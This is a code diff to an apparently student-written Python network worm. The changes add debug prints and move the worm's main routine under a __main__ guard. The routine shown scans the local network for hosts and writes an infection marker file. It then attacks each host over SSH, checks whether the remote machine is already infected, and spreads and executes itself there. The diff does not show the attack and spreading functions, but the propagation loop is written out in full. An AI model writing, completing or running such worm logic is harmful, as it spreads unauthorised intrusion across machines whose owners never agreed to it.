@@ -214,7 +214,7 @@ def getMyIP(interface):
 
         # Get all the network interfaces on the system
         networkInterfaces = netifaces.interfaces()
-
+        print("NetworkInterfaces: ", networkInterfaces)
         # The IP address
         ipAddr = None
 
@@ -223,7 +223,7 @@ def getMyIP(interface):
 
                 # The IP address of the interface
                 addr = netifaces.ifaddresses(netFace)[2][0]['addr']
-
+                print("addr qq: ", addr)
                 # Get the IP address
                 if not addr == "127.0.0.1":
 
@@ -261,35 +261,34 @@ def getHostsOnTheSameNetwork():
 
 	return liveHosts
 
+if __name__ == "__main__":
+	# Get the hosts on the same network
+	networkHosts = getHostsOnTheSameNetwork()
+	print ("Found hosts: ", networkHosts)
+	if not os.path.exists(INFECTED_MARKER_FILE):
+		markInfected()
+	else:
+		print ("Already Infected")
+		sys.exit()
 
-# Get the hosts on the same network
-networkHosts = getHostsOnTheSameNetwork()
-print ("Found hosts: ", networkHosts)
-if not os.path.exists(INFECTED_MARKER_FILE):
-	markInfected()
-else:
-	print ("Already Infected")
-	sys.exit()
-
-# Go through the network hosts
-for host in networkHosts:
-	
-	# Try to attack this host
-	sshInfo =  attackSystem(host)
-	
-	print (sshInfo)
-	
-	
-	# Did the attack succeed?
-	if sshInfo:
+	# Go through the network hosts
+	for host in networkHosts:
 		
-		print ("Trying to spread")
-		qq = isInfectedSystem(sshInfo[0])
-		if qq == True:
-			print ("Remote System is Infected")
-			continue
-		else:
-			spreadAndExecute(sshInfo[0])
-			print ("Spreading complete on " + host)
-			sys.exit()	
-	
+		# Try to attack this host
+		sshInfo =  attackSystem(host)
+		
+		print (sshInfo)
+		
+		
+		# Did the attack succeed?
+		if sshInfo:
+			
+			print ("Trying to spread")
+			qq = isInfectedSystem(sshInfo[0])
+			if qq == True:
+				print ("Remote System is Infected")
+				continue
+			else:
+				spreadAndExecute(sshInfo[0])
+				print ("Spreading complete on " + host)
+				sys.exit()
